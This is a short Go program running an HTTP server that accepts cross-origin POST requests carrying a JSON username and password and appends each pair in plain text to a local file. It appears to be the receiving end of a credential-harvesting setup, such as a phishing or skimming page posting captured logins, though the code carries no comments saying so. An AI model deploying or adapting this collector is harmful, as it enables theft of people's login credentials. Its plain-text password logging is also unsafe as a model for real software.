package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func getRoot(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		return
	}
	fmt.Printf("got / request\n")
	f, errF := os.OpenFile("data.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModeAppend)
	if errF != nil {
		log.Panic(errF)
	}
	defer func() {
		if err := f.Close(); err != nil {
			log.Panic(err)
		}
	}()

	buf := new(strings.Builder)
	_, err := io.Copy(buf, r.Body)
	if err != nil {
		log.Panic(err)
	}

	var m struct {
		Password string
		Username string
	}

	str := buf.String()
	err = json.Unmarshal([]byte(str), &m)
	if err != nil {
		log.Panic(err)
	}

	_, errW := f.Write([]byte(fmt.Sprintf("%s - %s\n", m.Username, m.Password)))
	if errW != nil {
		log.Panic(errW)
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	io.WriteString(w, "ok\n")
}

func main() {
	http.HandleFunc("/", getRoot)
	err := http.ListenAndServe(":3333", nil)

	if errors.Is(err, http.ErrServerClosed) {
		fmt.Printf("server closed\n")
	} else if err != nil {
		fmt.Printf("error starting server: %s\n", err)
		os.Exit(1)
	}
}
